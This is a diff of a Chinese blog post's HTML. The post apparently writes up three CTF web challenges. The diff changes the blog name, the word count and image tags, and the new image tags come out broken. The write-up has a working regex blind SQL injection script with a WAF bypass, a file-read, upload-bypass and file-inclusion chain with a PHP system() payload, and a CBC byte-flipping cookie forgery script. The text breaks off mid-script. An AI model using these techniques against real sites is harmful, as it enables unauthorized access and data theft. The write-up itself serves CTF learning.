@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>有点意思的3道web题 · Sky&#39;s blog</title>
+    <title>有点意思的3道web题 · sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -214,14 +214,14 @@
     
     <div class="banner">
             <div class="blog-title">
-                <a href="/" >Sky&#39;s blog</a>
+                <a href="/" >sky&#39;s blog</a>
             </div>
             <div class="post-title">
                 <a href="#" class="post-name">有点意思的3道web题</a>
             </div>
     </div>
     
-    <a class="home-link" href=/>Sky's blog</a>
+    <a class="home-link" href=/>sky's blog</a>
 </header>
     <div class="wrapper">
         <div class="site-intro" style="
@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3,441</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3,464</span>阅读时长: <span class="post-count reading-time">16 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -408,36 +408,36 @@ height:50vh;
 <h3 id="题目解法一"><a href="#题目解法一" class="headerlink" title="题目解法一"></a>题目解法一</h3><p>这是属于比较常规的思路，即fuzz一下过滤参数，然后找到未被过滤的参数，进行拼接绕过waf，这里题目限制严格，而手动测试容易得知：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.	or的过滤可以用||绕过</span><br><span class="line">2.	空格的过滤可用%0a绕过</span><br></pre></td></tr></table></figure></p>
 <p>而后我们知道flag是当前表字段pass的值，那么问题来了<br>如何去注入得到这个值？<br>一般的方法是构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Username = &apos;||%0apass%0aregexp%0a&apos;flag&#123;……</span><br><span class="line">``` </span><br><span class="line">而此我们正是用正则一位一位去匹配注入，得到想要的值</span><br><span class="line">但是问题直接来了：</span><br><span class="line">首先是通配符的问题，可以直接满足脚本，例如`flag&#123;____________&#125;`，这显然不是我们想要的值</span><br><span class="line">然后大小问题的区分，比如flag为flag&#123;Xctf_Enc&#125;,而我们得到的却是flag&#123;xctf_enc&#125;，这样也是不可取的</span><br><span class="line">所以这里需要用到另一个参数binary</span><br><span class="line">此时可以组合使用：</span><br></pre></td></tr></table></figure></p>
 <p>REGEXP BINARY<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">这样就可以成功的大小写识别了，实现区分大小写的正则注入</span><br><span class="line">我的脚本如下:</span><br><span class="line">```python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line">payload = &quot;flag&#123;&quot;</span><br><span class="line">flag = payload</span><br><span class="line">url = &quot;http://qcloudcetc.xctf.org.cn:8099/findpwd.php&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    for j in string.letters+&quot;1234567890!@#$%^&amp;*()_-+=&#125;?&quot;:</span><br><span class="line">        payload += j</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:urllib.unquote(&quot;&apos;||%0apass%0aregexp%0abinary%0a&apos;&quot;)+payload</span><br><span class="line">            &#125;</span><br><span class="line">        print data</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;您的密保问题是cetc&quot; in r.content:</span><br><span class="line">            flag = payload</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            payload = flag</span><br></pre></td></tr></table></figure></p>
-<h3 id="题目解法二"><a href="#题目解法二" class="headerlink" title="题目解法二"></a>题目解法二</h3><p>由于题目是云waf，这里还存在一个十分XD的解法<br>即构造超长字符串，可以使云waf不再对我们的数据进行检测，从而直接绕过云waf<br>如图：我们可以直接无视云waf，使用union select注入，此时的页面失去云waf的保护变得不堪一击。<br><img src="/images/3inter (1).jpg">  </p>
+<h3 id="题目解法二"><a href="#题目解法二" class="headerlink" title="题目解法二"></a>题目解法二</h3><p>由于题目是云waf，这里还存在一个十分XD的解法<br>即构造超长字符串，可以使云waf不再对我们的数据进行检测，从而直接绕过云waf<br>如图：我们可以直接无视云waf，使用union select注入，此时的页面失去云waf的保护变得不堪一击。<br><img src="/images/3inter (1" alt="">.jpg”&gt;  </p>
 <h2 id="有趣的组合拳"><a href="#有趣的组合拳" class="headerlink" title="有趣的组合拳"></a>有趣的组合拳</h2><h3 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h3><p>题目同样来自最近的xctf赛博地球杯工业互联网安全大赛，考点也比较多，考察了代码审计与综合应用的能力，考察点为以下几步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.任意文件读取</span><br><span class="line">2.上传文件绕过</span><br><span class="line">3.文件包含</span><br></pre></td></tr></table></figure></p>
 <h3 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h3><p>题目给出了文件泄露：<code>.index.php.swn</code><br>拿到源码后发现关键函数1：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($adfile, $file)</span></span>&#123;</span><br><span class="line">  <span class="comment">//Only Administrators can download files .</span></span><br><span class="line">      $cert = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($adfile) &amp;&amp; file_get_contents($adfile, <span class="string">'r'</span>) === <span class="string">'Yeah Everything Will Be Ok My Boss'</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Welcome ! You Are Administrator !"</span>;</span><br><span class="line">      $cert = <span class="string">'Y'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"error1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($cert === <span class="string">'Y'</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">'error4'</span>);</span><br><span class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">      header(<span class="string">'Content-Type: application/octet-stream'</span>);</span><br><span class="line">      header(<span class="string">'Content-Disposition: attachment; filename='</span>. basename($file));</span><br><span class="line">      header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">      header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">      header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">      header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">      header(<span class="string">'Content-Length: '</span> . filesize($file));</span><br><span class="line">      readfile($file);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'error2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'error3'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>关键函数2：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($page)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'uploaded'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no uploaded uploaded uploaded uploaded !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'://f'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no ://f ://f ://f'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'ata'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no ata ata ata'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'0'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'no 0 0 0'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"./includes/$page.php"</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(file_exists(<span class="string">"./includes/$page"</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File is not exit "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>关键函数1告诉我们：可以读文件<br>关键函数2告诉我们：存在文件包含<br>所以现在的思路比较清晰：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.	利用关键函数1去读上传的代码，找到上传漏洞</span><br><span class="line">2.	利用上传功能上传我们的恶意文件</span><br><span class="line">3.	利用文件包含去包含我们的恶意文件，拿到flag</span><br></pre></td></tr></table></figure></p>
 <p>首先看关键函数1：<br>有一个检测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($adfile) &amp;&amp; file_get_contents($adfile, &apos;r&apos;) === &apos;Yeah Everything Will Be Ok My Boss&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>此处我们容易利用php://input伪协议轻松绕过<br><img src="/images/3inter (3).png"><br>所以可以轻松拿到upload.php的源码<br>而在upload.php中我们容易发现几处关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'zip'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'jpg'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'png'</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'file can not upload ! '</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>此处我们容易利用php://input伪协议轻松绕过<br><img src="/images/3inter (3" alt="">.png)<br>所以可以轻松拿到upload.php的源码<br>而在upload.php中我们容易发现几处关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'zip'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'jpg'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'png'</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'file can not upload ! '</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>此处限制了只能上传zip,jpg,png<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($type !== <span class="string">"application/zip"</span> || $size &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Format not allowed or file size too big!"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
 <p>此处限制了格式问题，这里抓包可以轻松改掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(file_exists(&apos;includes&apos;))&#123;</span><br><span class="line">            move_uploaded_file($temp, &quot;includes/uploaded/&quot; .$name);</span><br><span class="line">            echo &quot;Upload complete a!&quot;;</span><br><span class="line">            shell_exec(&apos;sh /var/www/html/includes/unzip.sh&apos;);</span><br><span class="line">          &#125;elseif(file_exists(&apos;uploaded&apos;))&#123;</span><br><span class="line">            move_uploaded_file($temp, &quot;uploaded/&quot; .$name);</span><br><span class="line">            echo &quot;Upload complete!&quot;;</span><br><span class="line">            shell_exec(&apos;sh /var/www/html/includes/unzip.sh&apos;);</span><br></pre></td></tr></table></figure></p>
 <p>此处对我们上次的文件进行了一个处理，而处理脚本是<code>unzip.sh</code><br>所以下一步我们要去读这个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">!#/bin/bash</span><br><span class="line">cd ./uploaded</span><br><span class="line">find ./ -size +1M | xargs rm</span><br><span class="line">cd ../</span><br><span class="line">unzip -o ./uploaded/*.zip -d ./uploaded/</span><br><span class="line">rm -rf ./uploaded/*.zip</span><br><span class="line">rm -rf ./uploaded/*.*</span><br><span class="line">rm -rf ./uploaded/.*</span><br><span class="line">cd ./uploaded</span><br><span class="line">find -type d | xargs rm -rf</span><br><span class="line">touch /var/www/html/includes/uploaded/index.php</span><br><span class="line">chmod 000 /var/www/html/includes/uploaded/index.php</span><br></pre></td></tr></table></figure></p>
 <p>容易发现这个脚本将我们上传的zip解压，并删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ./uploaded/*.zip</span><br><span class="line">rm -rf ./uploaded/*.*</span><br><span class="line">rm -rf ./uploaded/.*</span><br></pre></td></tr></table></figure></p>
 <p>这里我们容易发现一个问题，就是如果不带后缀的话，将不会被匹配，也就意味着上传成功，不会被删除<br>所以我的做法如下：<br>生成一个名为sky的文件，写入内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'cat flag/flag/flag/flag/flag/flag/flag.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>然后压缩上传，抓包改Content-Type即可<br>然后上传后我们得到文件路径：<br><code>http://47.104.188.226:20001/includes/uploaded/sky</code><br>此时就需要用到之前提到的文件包含功能<br><code>http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/sky</code><br>然后根据<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">"./includes/$page.php"</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page.php"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>我们包含后的文件变成<br><code>http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/sky.php</code><br>此时即可拿到flag<br><img src="/images/3inter (4).png">  </p>
+<p>我们包含后的文件变成<br><code>http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/sky.php</code><br>此时即可拿到flag<br><img src="/images/3inter (4" alt="">.png)  </p>
 <h2 id="CBC-SSRF"><a href="#CBC-SSRF" class="headerlink" title="CBC-SSRF"></a>CBC-SSRF</h2><h3 id="题目简介-1"><a href="#题目简介-1" class="headerlink" title="题目简介"></a>题目简介</h3><p>题目来自CUMT2018校赛，改编自山科大的一道CBC字节翻转的题目。<br>主要考察点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.	CBC字节翻转攻击突破登录限制</span><br><span class="line">2.	Curl读hosts发现内网</span><br><span class="line">3.	利用curl进行内网攻击</span><br></pre></td></tr></table></figure></p>
-<h3 id="前引知识"><a href="#前引知识" class="headerlink" title="前引知识"></a>前引知识</h3><p>以前在另一篇文章中提过，这里再简单说一下CBC字节翻转攻击<br><img src="/images/3inter (5).png"><br>关注这个解密过程<br>但这时，我们是已知明文，想利用iv去改变解密后的明文<br>比如我们知道明文解密后是1dmin<br>我们想构造一个iv，让他解密后变成admin<br>还是原来的思路<br><code>原来的Iv[1]^middle[1]=plain[1]</code><br>而此时<br>我们想要<br><code>构造的iv[1]^mddle[1]=’a’</code><br>所以我们可以得到<br><code>构造的iv[1] = middle[1]^’a’</code><br>而<code>middle[1]=原来的iv[1]^plain[1]</code><br>所以最后可以得到公式<br><code>构造的iv[1]= 原来的iv[1]^plain[1]^’a’</code><br>所以即可造成数据的伪造<br>我们可以用这个式子，遍历明文，构造出iv，让程序解密出我们想要的明文</p>
-<h3 id="题目解法-1"><a href="#题目解法-1" class="headerlink" title="题目解法"></a>题目解法</h3><p>进去后发现是一个登陆页面<br><img src="/images/3inter (6).png"><br>尝试登陆<br><img src="/images/3inter (7).png"><br>得到回显<br><img src="/images/3inter (8).png"><br>尝试其他<br><img src="/images/3inter (9).png"><br>感觉上十分矛盾，需要admin登陆，却又不能用admin登陆<br>此时扫描一波目录，容易得到admin.php和login.php~的文件泄露<br>尝试直接访问admin.php<br>得到回显<br><img src="/images/3inter (10).png"><br>阅读login.php~的文件泄露<br><img src="/images/3inter (11).png"><br><img src="/images/3inter (12).png"><br><img src="/images/3inter (13).png"><br>关键点如上<br>Login函数会把info变量当做明文，用随机生成的token作为iv进行aes-128-cbc方式的加密，其中，密钥我们是不知道的<br>然后会把加密后的密文base64后赋值到cookie里的cipher，把iv的base64后的值赋值到cookie里的token<br>然后继续审计<br><img src="/images/3inter (14).png"><br>Is_admin()函数是我们欺骗的关键<br>这里他将token和cipher解base64还原，然后进行解密<br>再将明文反序列化<br>如果反序列化成功，那么反序列化后的username字段会被赋值到session的username，否则将反序列化失败的明文的base64打印出来<br>继续往后看<br><img src="/images/3inter (15).png"><br>登录的时候会把用户名和密码进行序列化，传递给login（）函数进行加密<br><img src="/images/3inter (16).png"><br>然后经过<code>is_admin()</code>函数进行解密判断，如果成为admin就登录成功<br>那么下面我们开始构造<br>首先我们得研究清楚，反序列化后是什么<br>如果我们用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure></p>
+<h3 id="前引知识"><a href="#前引知识" class="headerlink" title="前引知识"></a>前引知识</h3><p>以前在另一篇文章中提过，这里再简单说一下CBC字节翻转攻击<br><img src="/images/3inter (5" alt="">.png)<br>关注这个解密过程<br>但这时，我们是已知明文，想利用iv去改变解密后的明文<br>比如我们知道明文解密后是1dmin<br>我们想构造一个iv，让他解密后变成admin<br>还是原来的思路<br><code>原来的Iv[1]^middle[1]=plain[1]</code><br>而此时<br>我们想要<br><code>构造的iv[1]^mddle[1]=’a’</code><br>所以我们可以得到<br><code>构造的iv[1] = middle[1]^’a’</code><br>而<code>middle[1]=原来的iv[1]^plain[1]</code><br>所以最后可以得到公式<br><code>构造的iv[1]= 原来的iv[1]^plain[1]^’a’</code><br>所以即可造成数据的伪造<br>我们可以用这个式子，遍历明文，构造出iv，让程序解密出我们想要的明文</p>
+<h3 id="题目解法-1"><a href="#题目解法-1" class="headerlink" title="题目解法"></a>题目解法</h3><p>进去后发现是一个登陆页面<br><img src="/images/3inter (6" alt="">.png)<br>尝试登陆<br><img src="/images/3inter (7" alt="">.png)<br>得到回显<br><img src="/images/3inter (8" alt="">.png)<br>尝试其他<br><img src="/images/3inter (9" alt="">.png)<br>感觉上十分矛盾，需要admin登陆，却又不能用admin登陆<br>此时扫描一波目录，容易得到admin.php和login.php~的文件泄露<br>尝试直接访问admin.php<br>得到回显<br><img src="/images/3inter (10" alt="">.png)<br>阅读login.php~的文件泄露<br><img src="/images/3inter (11" alt="">.png)<br><img src="/images/3inter (12" alt="">.png)<br><img src="/images/3inter (13" alt="">.png)<br>关键点如上<br>Login函数会把info变量当做明文，用随机生成的token作为iv进行aes-128-cbc方式的加密，其中，密钥我们是不知道的<br>然后会把加密后的密文base64后赋值到cookie里的cipher，把iv的base64后的值赋值到cookie里的token<br>然后继续审计<br><img src="/images/3inter (14" alt="">.png)<br>Is_admin()函数是我们欺骗的关键<br>这里他将token和cipher解base64还原，然后进行解密<br>再将明文反序列化<br>如果反序列化成功，那么反序列化后的username字段会被赋值到session的username，否则将反序列化失败的明文的base64打印出来<br>继续往后看<br><img src="/images/3inter (15" alt="">.png)<br>登录的时候会把用户名和密码进行序列化，传递给login（）函数进行加密<br><img src="/images/3inter (16" alt="">.png)<br>然后经过<code>is_admin()</code>函数进行解密判断，如果成为admin就登录成功<br>那么下面我们开始构造<br>首先我们得研究清楚，反序列化后是什么<br>如果我们用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure></p>
 <p>进行登录<br>序列化后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>但是这样显然不能成功，因为题目过滤了admin，所以我们尝试用1dmin<br>这样序列化后的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>按照aes-128-cbc的分组方式将序列化分组，即16个一组<br>得到如下排列：<br><img src="/images/3inter (17).png"><br>根据cbc翻转攻击的方式：<br>我们改变iv的某个字符将会影响第一组对应字符位置的值，<br>改变第一组某个字符将会影响第二组对应字符位置的值<br>那么我们现在想把第二组的1dmin的‘1’改为‘a’<br>即：第二组的第10位改变成‘a’<br>所以可以应用cbc翻转攻击的公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">替换后的ord_new = ord(‘&quot;’)^ord(‘a’)^ord(‘1’)</span><br></pre></td></tr></table></figure></p>
+<p>按照aes-128-cbc的分组方式将序列化分组，即16个一组<br>得到如下排列：<br><img src="/images/3inter (17" alt="">.png)<br>根据cbc翻转攻击的方式：<br>我们改变iv的某个字符将会影响第一组对应字符位置的值，<br>改变第一组某个字符将会影响第二组对应字符位置的值<br>那么我们现在想把第二组的1dmin的‘1’改为‘a’<br>即：第二组的第10位改变成‘a’<br>所以可以应用cbc翻转攻击的公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">替换后的ord_new = ord(‘&quot;’)^ord(‘a’)^ord(‘1’)</span><br></pre></td></tr></table></figure></p>
 <p>也就是说将此时的第一组的第10个字符改成chr(ord_new)即可<br>（注：双引号是第一组的第10个字符，1是第二组的第10个字符，a是我们想要的字符）<br>我们测试一下<br>脚本如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://123.206.222.169:50001/login.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"logname"</span>:<span class="string">"1dmin"</span>,</span><br><span class="line">    <span class="string">"logpass"</span>:<span class="string">"123"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">list = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">", "</span>)</span><br><span class="line">token = urllib.unquote(list[<span class="number">1</span>][<span class="number">6</span>:])</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(list[<span class="number">2</span>][<span class="number">7</span>:]))</span><br><span class="line">phpsessid = list[<span class="number">0</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">10</span>:]</span><br><span class="line">block = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">16</span>):</span><br><span class="line">    block.append(cipher[i:i+<span class="number">16</span>])</span><br><span class="line">replace = chr(ord(block[<span class="number">0</span>][<span class="number">9</span>]) ^ ord(<span class="string">'1'</span>) ^ ord(<span class="string">'a'</span>))</span><br><span class="line">block[<span class="number">0</span>] = block[<span class="number">0</span>][:<span class="number">9</span>]+replace+block[<span class="number">0</span>][<span class="number">10</span>:]</span><br><span class="line">token = base64.b64decode(token)</span><br><span class="line">cipher_new = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(block)):</span><br><span class="line">    cipher_new += block[i]</span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:phpsessid,</span><br><span class="line">    <span class="string">"cipher"</span>:urllib.quote(base64.b64encode(cipher_new)),</span><br><span class="line">    <span class="string">"token"</span>:urllib.quote(base64.b64encode(token))</span><br><span class="line">&#125;</span><br><span 